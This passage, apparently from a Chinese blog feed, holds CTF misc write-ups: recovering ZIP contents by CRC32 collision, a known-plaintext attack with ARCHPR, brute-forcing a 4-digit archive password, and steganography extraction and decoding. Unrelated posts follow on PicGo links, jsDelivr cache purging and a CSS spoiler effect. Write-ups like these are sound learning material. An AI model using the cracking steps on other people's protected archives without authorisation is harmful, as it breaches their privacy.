&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(num):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t &lt;span style="color:#f92672"&gt;=&lt;/span&gt; threading&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Thread(target&lt;span style="color:#f92672"&gt;=&lt;/span&gt;crc, args&lt;span style="color:#f92672"&gt;=&lt;/span&gt;(_args[i],))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _thread&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(t) &lt;span style="color:#75715e"&gt;#如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# print(_thread)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(num):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _thread[i]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;start()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(num):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _thread[i]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;join()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; input()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; crc32()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用python的多线程，因为是5个文件，开了5个线程，然后分别输入CRC码，压缩文件原来的CRC码为：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;ff92876d
6c4a558b
77e8fd00
1e59a66e
d1f4eb9a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;碰撞以后获得的明文：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1on}
32co
llis
flag
{crc
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据flag的结构拼接一下：&lt;strong&gt;flag{crc32collis1on}&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id="kaomoji"&gt;kaomoji
&lt;/h2&gt;&lt;p&gt;题目的压缩包解压以后得到一个&lt;strong&gt;flag.zip&lt;/strong&gt;压缩包和&lt;strong&gt;secret.txt&lt;/strong&gt;，flag.zip中也含有secret.txt，将外面没有加密的secret.txt使用&lt;strong&gt;winrar&lt;/strong&gt;压缩（需要和原来的压缩软件一致哒）以后对比flag.zip里的文件发现CRC码相同的：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201103227.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;配合ARCHPR使用明文攻击，获得加密密钥： &lt;strong&gt;[b00df998 5bdbbde6 485fa1f8]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我在进行明文攻击时虽然没有跑出来压缩包的密码，但是获得了上面的密钥，也是可以解压加密的压缩包的（具体原理不清楚）。解压明文攻击解开获得的压缩包&lt;strong&gt;flag_decrypted.zip&lt;/strong&gt;，打开flag.txt是颜文字表情加密，直接复制到浏览器console控制台运行获得flag：flag{kaomoj1_1s_cut3}&lt;/p&gt;
&lt;h2 id="archpr"&gt;ARCHPR
&lt;/h2&gt;&lt;p&gt;题目根据提示：&lt;strong&gt;This file was encrypted by me with a four-digit password, try to crack it!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;密码只是用了4位数字加密，可以使用ARCHPR 进行爆破，获得一个flag.png和hint.txt，hint.txt如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-hint.txt" data-lang="hint.txt"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;The flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase.
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;key: .--. .- ... ... .-- --- .-. -..
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;提示中提到了使用LSB隐写，密码是一段摩斯密码，摩斯密码解密后得到密文：&lt;code&gt;password&lt;/code&gt;，使用LSB（&lt;a class="link" href="https://github.com/livz/cloacked-pixel" target="_blank" rel="noopener"
&gt;项目地址&lt;/a&gt;）脚本执行：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;python lsb.py extract flag.png 1.txt password
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;1.txt&lt;/strong&gt;中就包含了解密以后的flag：&lt;strong&gt;flag{th1s_15_f1agggggg}&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id="outguess"&gt;outguess
&lt;/h2&gt;&lt;p&gt;​ 看题目找工具，使用outguess参考&lt;a class="link" href="https://blog.csdn.net/weixin_43877387/article/details/103123858" target="_blank" rel="noopener"
&gt;隐写工具outguess 的下载安装及使用&lt;/a&gt;，在kali中安装以后执行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;outguess -r flag.jpg hide.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获得hide.txt文件的内容：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;Qb lbh xabj NRF? Gur xrl vf f3phe1gl, tb naq penpx vg!
Encrypted data: U2FsdGVkX1/nmu9u2Ho1dD9kQWv7L5a6bsUrWxBkVp68txdFL4v/givGGYy7dBU+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上面一段使用&lt;strong&gt;凯撒密码&lt;/strong&gt;移动13位获得：&lt;strong&gt;Do you know AES? The key is s3cur1ty, go and crack it!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其实这里和别人讨论以后才知道他们使用的是叫ROT13，相应的还搜到了ROT5、ROT13、ROT18、ROT47，百度百科看了以后就是凯撒密码的变种。所以下面一段的密文使用AES进行解密，密码是&lt;code&gt;s3cur1ty&lt;/code&gt;，获得flag：&lt;strong&gt;flag{y0u_ar3_awes0m3}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;解密网站：https://tool.oschina.net/encrypt&lt;/p&gt;
&lt;h2 id="whitespace"&gt;Whitespace
&lt;/h2&gt;&lt;p&gt;题目即提示，Whitespace进行一波搜索以后了解到是一种用空白符编程的语言，在压缩包里面摸了好久，在注释里发现空白编码：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201104847.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;这也让我想到自己在网上下工具的压缩包时，网站经常在注释里附上密码，通常都是网站的网址。&lt;/p&gt;
&lt;p&gt;在&lt;a class="link" href="https://vii5ard.github.io/whitespace" target="_blank" rel="noopener"
&gt;whitespace&lt;/a&gt;网站中粘贴密文点上面的&lt;code&gt;run&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201105235.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;解密获得：&lt;strong&gt;password is BlindWaterMark!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;输入解压以后获得两张看着相同的罗翔老师.png图片和一个hint.txt：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-hint.txt" data-lang="hint.txt"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Do you see any difference between the two pictures?
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get to know its secrets and tell you quietly that you need to know a knowledge called Manchester coding.
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;上传文档
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;你看这两幅画有什么不同吗？
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;了解它的秘密，悄悄地告诉你，你需要知道一门叫做曼彻斯特编码的知识。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据提示找出图片的不同和曼切斯特编码。图片看着相同但是经过加密，在网上搜索了一波了解到了&lt;strong&gt;盲水印&lt;/strong&gt;技术，使用盲水印解密图片，项目地址：https://github.com/chishaxie/BlindWaterMark，执行：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;python bwn.py decode 2.png 1.png 3.png
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获得解密图片：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201105728.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;图片中的内容为：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;296969a5695
6696a6a9a69
5669595a566
965696666aa
69596a9666a
a6a6569955a
5a66aa69a56
9566a6a6aa6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就百度曼切斯特编码解码，找到一篇博客：&lt;a class="link" href="https://blog.csdn.net/weixin_30416871/article/details/98566881" target="_blank" rel="noopener"
&gt;一些CTF编码脚本&lt;/a&gt;，在里面找到了这两段：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201105901.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;心里一顿狂喜，因为都是&lt;code&gt;2965a&lt;/code&gt;这个几个字符组成的，应该就是找对了。根据博客代码自行修改脚本&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;import sys
s = &amp;#39;296969a56956696a6a9a695669595a566965696666aa69596a9666aa6a6569955a5a66aa69a569566a6a6aa6&amp;#39; #这是前面图片里的内容
s=bin(int(s,16))
r=&amp;#34;&amp;#34;
for i in range(len(s)/2):
if s[i*2:i*2+2] == &amp;#39;10&amp;#39;:
r += &amp;#39;1&amp;#39;
else:
r += &amp;#39;0&amp;#39;
print hex(int(r,2))[2:-1].decode(&amp;#39;hex&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行脚本后获得flag：&lt;strong&gt;flag{ab1de_by_th3_law}&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id="steghide"&gt;Steghide
&lt;/h2&gt;&lt;p&gt;题目即工具。参考博客&lt;a class="link" href="https://www.jianshu.com/p/c3679f805a0c" target="_blank" rel="noopener"
&gt;隐写工具Steghide&lt;/a&gt;，在kali中安装Steghide后执行：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;steghide.exe extract -sf trump.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;会提示&lt;code&gt;Enter passphrase:&lt;/code&gt;直接回车表示空密码，获得flag.txt，打开以后里面都是由&lt;code&gt;¿ ¡ .&lt;/code&gt;组成的密文，和&lt;strong&gt;Ook&lt;/strong&gt;的另一种编码：&lt;strong&gt;short Ook&lt;/strong&gt;类似也是只用&lt;code&gt;? ! .&lt;/code&gt;组成，把叹号和问号全部替换反过来&lt;code&gt;¡---&amp;gt;! ¿---&amp;gt;?&lt;/code&gt;，替换之后在线解码：https://www.splitbrain.org/services/ook，获得flag：&lt;strong&gt;flag{y0u_ar3_clev3r}&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id="sstv"&gt;SSTV
&lt;/h2&gt;&lt;p&gt;题目既是工具。搜索SSTV百度百科：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;了解到是一种无线电传递图片的方法，搜到的博客&lt;a class="link" href="https://blog.csdn.net/zkf0100007/article/details/83387790" target="_blank" rel="noopener"
&gt;慢扫描电视 SSTV&lt;/a&gt;和B站的视频&lt;a class="link" href="https://www.bilibili.com/video/BV1ea4y1J787" target="_blank" rel="noopener"
&gt;慢扫描电视SSTV&lt;/a&gt;，下载MMSSTV软件，把output.wav音频调制麦克风输出，我使用的方法是在声音设置里把立体声混音打开并且设为默认设备，然后电脑里播放的声音就会被录制到。等待图片绘制成功，获得flag：&lt;strong&gt;DMCTF{SSTV,yyds?}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201111538.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="simpleqrcode"&gt;SimpleQrcode
&lt;/h2&gt;&lt;p&gt;​ 下载题目是一个gif图片都是二维码，使用使用stegSovle中的Frame Browser功能，一帧一帧播放，一帧一扫，有几帧图片是少了二维码的上边，有一张是少了右边，可以参考第一张完整的图片，把上面截取拼接上去，扫码后17张图片对应的内容（根据代码行号）：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;DM
CT
F{
Qr
Co
de
_1
s_
so
_i
nt
er
es
ti
ng
!!
!}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考下题目标题和flag格式，拼接后获得flag：&lt;strong&gt;DMCTF{QrCode_1s_so_interesting!!!}&lt;/strong&gt;&lt;/p&gt;</description></item><item><title>PicGo复制自定义链接</title><link>https://www.braindance.top/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/</link><pubDate>Mon, 30 Nov 2020 09:54:11 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/</guid><description>&lt;p&gt;2022年2月3日22:41:32&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;！！！！！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;建议直接看文章末尾，我发现我就是个笨比。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id="前言"&gt;前言
&lt;/h1&gt;&lt;p&gt;现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PicGo 本体支持如下图床：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;七牛图床&lt;/code&gt; v1.0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;腾讯云 COS v4\v5 版本&lt;/code&gt; v1.1 &amp;amp; v1.5.0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;又拍云&lt;/code&gt; v1.2.0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GitHub&lt;/code&gt; v1.5.0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SM.MS V2&lt;/code&gt; v2.3.0-beta.0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;阿里云 OSS&lt;/code&gt; v1.6.0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Imgur&lt;/code&gt; v1.6.0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;本体不再增加默认的图床支持。你可以自行开发第三方图床插件。&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;项目地址：&lt;a class="link" href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener"
&gt;PicGo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;软件界面：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130095609.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h1 id="起因"&gt;起因
&lt;/h1&gt;&lt;p&gt;PicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含&lt;code&gt;$url&lt;/code&gt;参数，也就是默认的url地址：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130093835.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。&lt;/p&gt;
&lt;h1 id="解决方法"&gt;解决方法
&lt;/h1&gt;&lt;p&gt;在软件设置的配置文件里找到了&lt;code&gt;customLink&lt;/code&gt;，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130094455.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130094651.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h1 id="结语"&gt;结语
&lt;/h1&gt;&lt;p&gt;软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了&lt;code&gt;$filename&lt;/code&gt;变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是&lt;code&gt;png&lt;/code&gt;格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接&lt;code&gt;Crtl+Shift+i&lt;/code&gt;，把图片链接贴里面就彳亍了。~&lt;del&gt;白嫖真爽&lt;/del&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;2022-1-31 11:43:48&lt;/p&gt;
&lt;p&gt;这时候发现自定义链接直接用markdown格式就更好了&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-other" data-lang="other"&gt;![$fileName](https://cdn.jsdelivr.net/gh/username/repo@master/artical/$fileName.png)
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="最简单修改"&gt;最简单修改
&lt;/h1&gt;&lt;p&gt;前面的都是我在改自定义链接，至少明白了可以绕过自定义链接必须包含变量名称这个限制。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032246055.png"
loading="lazy"
alt="image-20220203224558136"
&gt;&lt;/p&gt;
&lt;p&gt;直接在自定义域名那里修改成jsDeliver对应的仓库路径，比如我的&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-other" data-lang="other"&gt;https://cdn.jsdelivr.net/gh/penginman/PicBed@master
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后返回的链接就会把原来的&lt;code&gt;raw.github.com/xxxxxx&lt;/code&gt;给替代了。&lt;/p&gt;</description></item><item><title>jsdelivr 缓存刷新</title><link>https://www.braindance.top/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/</link><pubDate>Fri, 20 Nov 2020 22:02:46 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;​ 上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。&lt;/p&gt;
&lt;h2 id="缓存刷新"&gt;缓存刷新
&lt;/h2&gt;&lt;p&gt;把原来访问的链接&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://cdn.jsdelivr.net/...&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;改为&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://purge.jsdelivr.net/...&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;访问资源就会进行刷新，然后页面会返回刷新信息：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201120222419.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;划水收工。&lt;/p&gt;</description></item><item><title>萌娘百科黑幕实现</title><link>https://www.braindance.top/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/</link><pubDate>Fri, 20 Nov 2020 10:13:07 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;​ 老早就觉得&lt;a class="link" href="https://zh.moegirl.org.cn/Mainpage" target="_blank" rel="noopener"
&gt;萌娘百科&lt;/a&gt;里的&lt;code&gt;&amp;lt;span class='heimu'&amp;gt;黑幕&amp;lt;/span&amp;gt;&lt;/code&gt;很好玩，所以摸索着给自己博客加了一个。参考博客&lt;a class="link" href="https://www.cnblogs.com/send-off-a-friend/p/12355387.html" target="_blank" rel="noopener"
&gt;Re：萌娘百科上的黑幕实现&lt;/a&gt;。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线&lt;code&gt;~~ ~~&lt;/code&gt;标签修改了。我回来又想到了更好的方法，markdown支持文章中的&lt;strong&gt;自定义标签&lt;/strong&gt;，自己增加一个&lt;code&gt;&amp;lt;span class='heimu'&amp;gt;...&amp;lt;/span&amp;gt;&lt;/code&gt;标签更好。那么两种都记一下吧。当然用&lt;strong&gt;自定义标签&lt;/strong&gt;的话还可以保留&lt;strong&gt;删除线&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id="示例"&gt;示例
&lt;/h2&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气&amp;lt;/span&amp;gt;
&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气&amp;lt;/span&amp;gt;
&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;~~我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气~~&amp;lt;/span&amp;gt;
&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;**我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气**&amp;lt;/span&amp;gt;
&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气`&amp;lt;/span&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;原博客图&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210818171850.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;萌娘百科&lt;a class="link" href="https://zh.moegirl.org.cn/Template:%E9%BB%91%E5%B9%95" target="_blank" rel="noopener"
&gt;官方介绍&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="准备工作"&gt;准备工作
&lt;/h2&gt;&lt;p&gt;​ 先进入主题的资源文件夹&lt;code&gt;themes\butterfly\source\&lt;/code&gt;，修改需要用到的文件&lt;code&gt;css\_global\index.styl&lt;/code&gt;、&lt;code&gt;js/main.js&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;​ 说明一下两个文件的作用：主题的总样式表&lt;code&gt;index.css&lt;/code&gt;是经过整合形成的，而**.styl文件是基于Node.js的CSS的预处理框架**，我们会在这个里面添加黑幕的样式。&lt;code&gt;main.js&lt;/code&gt;里面使用选择器为标签添加&lt;code&gt;title='你知道的太多了'&lt;/code&gt;，这个可以修改成自己喜欢的。&lt;/p&gt;
&lt;h2 id="修改自定义标签"&gt;修改自定义标签
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;在&lt;code&gt;index.styl&lt;/code&gt;文件末尾添加&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-stylus" data-lang="stylus"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;, .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt; &lt;span style="color:#f92672"&gt;a&lt;/span&gt;, &lt;span style="color:#f92672"&gt;a&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;, .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt; &lt;span style="color:#f92672"&gt;a&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;new&lt;/span&gt;, .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt; &lt;span style="color:#f92672"&gt;code&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; background&lt;span style="color:#f92672"&gt;-&lt;/span&gt;color: &lt;span style="color:#ae81ff"&gt;#252525&lt;/span&gt; !important
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; color: &lt;span style="color:#ae81ff"&gt;#252525&lt;/span&gt; !important
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; text-shadow: &lt;span style="color:#66d9ef"&gt;none&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;hover&lt;/span&gt;, .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;active&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;hover&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;, .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;active&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;,.&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt; &lt;span style="color:#f92672"&gt;code&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;hover&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; color: &lt;span style="color:#66d9ef"&gt;white&lt;/span&gt; !important;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;hover&lt;/span&gt; &lt;span style="color:#f92672"&gt;a&lt;/span&gt;, &lt;span style="color:#f92672"&gt;a&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;hover&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;active&lt;/span&gt; &lt;span style="color:#f92672"&gt;a&lt;/span&gt;, &lt;span style="color:#f92672"&gt;a&lt;/span&gt;:&lt;span style="color:#960050;background-color:#1e0010"&gt;active&lt;/span&gt; .&lt;span style="color:#a6e22e"&gt;heimu&lt;/span&gt;
